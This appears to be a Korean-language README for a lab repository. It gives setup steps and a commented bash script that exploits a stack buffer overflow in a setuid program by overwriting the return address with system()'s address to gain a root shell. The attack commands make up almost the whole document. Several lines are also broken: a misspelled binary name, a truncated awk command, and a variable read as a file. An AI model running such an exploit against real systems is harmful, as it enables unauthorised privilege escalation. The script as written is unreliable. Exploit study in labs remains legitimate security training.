# BOF_Script
this refo contains unsafe code
# 사전작업
1. 작업을 수행할 계정으로 접속합니다.
2. /home/계정 폴더로 이동합니다.
3. 깃허브에 있는 파일들을 옮깁니다.
4. 스크립트를 실행합니다.

# 스크립트 설명
#!/bin/bash
gcc -o vuln vuln.c //vuln.c 컴파일

chmod +s vunl //권한 부여

gcc -o ./getaddr getaddr.c -lc -ldl //getaddr.c 컴파일

/bin/bash2 //bash2 실행

export PATH=$PATH:. //현재 위치 path에 추가

sysaddr=$(./getaddr) //주소 구한 뒤 저장

./vuln "$(perl -e 'print "A"x84 . pack("V", hex("$(<sysaddr)"))')" 2> arg //주소 변환하고 vuln에 인자로 넣어서 실행한 뒤 출력값 저장

xxd arg | awk '{for(i=2; i<=NF; i++) ~ //arg에서 원하는 부분 추출해 /bin/bash를 가리키는 심볼릭 링크 생성에 사용

./vuln "$(perl -e 'print "A"x84 . pack("V", hex("$(<sysaddr)"))')" //system함주 주소 대입해 vuln 실행

whoami //결과 확인
